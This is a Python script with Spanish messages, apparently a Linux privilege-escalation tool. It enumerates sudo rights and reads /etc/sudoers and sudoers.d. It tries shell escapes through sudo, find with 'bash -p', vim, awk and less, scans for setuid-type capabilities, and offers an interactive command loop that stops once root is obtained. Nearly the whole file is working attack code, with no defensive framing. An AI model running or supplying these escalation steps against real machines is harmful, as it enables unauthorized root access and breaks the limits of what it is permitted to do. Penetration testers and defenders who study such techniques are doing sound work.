import os
import subprocess
from shutil import which

def enum_sudo():
    if os.getuid() == 0:
        print("[+] Ya sos root (uid=0). Función detenida.")
        return

    # sudo -l
    if not which("sudo"):
        print("[-] sudo no disponible.")
    else:
        print("\n[+] sudo -l")
        print("-" * 40)
        os.system("sudo -l 2>/dev/null")

    # /etc/sudoers directo
    if os.path.exists("/etc/sudoers"):
        print("\n[+] /etc/sudoers")
        print("-" * 40)
        os.system("cat /etc/sudoers 2>/dev/null")
    else:
        print("[-] /etc/sudoers no accesible.")

    # sudoers.d
    if os.path.isdir("/etc/sudoers.d"):
        print("\n[+] /etc/sudoers.d/")
        print("-" * 40)
        os.system("ls -la /etc/sudoers.d/ 2>/dev/null")
        os.system("cat /etc/sudoers.d/* 2>/dev/null")
    else:
        print("[-] /etc/sudoers.d no existe.")

    # visudo (solo muestra si está disponible, no lo ejecuta)
    if which("visudo"):
        print("\n[i] visudo disponible en:", which("visudo"))
    else:
        print("[-] visudo no disponible.")

    # Busca NOPASSWD explícito (vector directo)
    print("\n[+] Buscando NOPASSWD...")
    os.system("sudo -l 2>/dev/null | grep -i nopasswd")
    os.system("grep -i nopasswd /etc/sudoers 2>/dev/null")
    os.system("grep -r nopasswd /etc/sudoers.d/ 2>/dev/null")

def is_root() -> bool:
    if os.getuid() == 0:
        print("[+] root (uid=0). Función detenida.")
        return True
    return False

def try_sudo_shell():
    if is_root(): return
    bins = ["/bin/sh", "/bin/bash", "bash", "sh"]
    for b in bins:
        if which(b) or os.path.exists(b):
            print(f"[+] Intentando: sudo {b}")
            os.system(f"sudo {b}")
            return
    print("[-] No se encontró shell binario.")

def try_suid_find():
    if is_root(): return
    if not which("find"):
        print("[-] find no disponible."); return
    print("[+] Ejecutando find SUID escape...")
    os.system("find . -exec /bin/bash -p \\; 2>/dev/null")

def try_suid_vim():
    if is_root(): return
    if not which("vim"):
        print("[-] vim no disponible."); return
    print("[+] Ejecutando vim shell escape...")
    os.system("vim -c ':!/bin/bash'")

def try_suid_awk():
    if is_root(): return
    if not which("awk"):
        print("[-] awk no disponible."); return
    print("[+] Ejecutando awk shell...")
    os.system("""awk 'BEGIN {system("/bin/bash")}'""")

def try_suid_less():
    if is_root(): return
    if not which("less"):
        print("[-] less no disponible."); return
    print("[+] less → escribí: !/bin/bash")
    os.system("less /etc/passwd")

def try_capabilities():
    if is_root(): return
    if not which("getcap"):
        print("[-] getcap no disponible."); return
    print("[+] Capabilities detectadas:")
    os.system("getcap -r / 2>/dev/null | grep -E 'cap_setuid|cap_sys_admin|cap_net_admin'")

def try_custom_cmd():
    """Input manual desde Python → ejecuta en shell"""
    if is_root(): return
    while True:
        cmd = input("[shell] $ ").strip()
        if cmd in ("exit", "q", "quit"):
            break
        if not cmd:
            continue
        result = os.popen(cmd).read()
        print(result)
        if os.getuid() == 0:
            print("[+] ROOT obtenido. Deteniendo.")
            break

def run_all():
    checks = [
        try_sudo_shell,
        try_suid_find,
        try_suid_vim,
        try_suid_awk,
        try_suid_less,
        try_capabilities,
        enum_sudo
    ]
    for fn in checks:
        if os.getuid() == 0:
            print("[+] ROOT. Stop.")
            return
        fn()

# Entry
if __name__ == "__main__":
    print("1) Auto-enum\n2) Comando manual")
    opt = input("> ").strip()
    if opt == "1":
        run_all()
    elif opt == "2":
        try_custom_cmd()
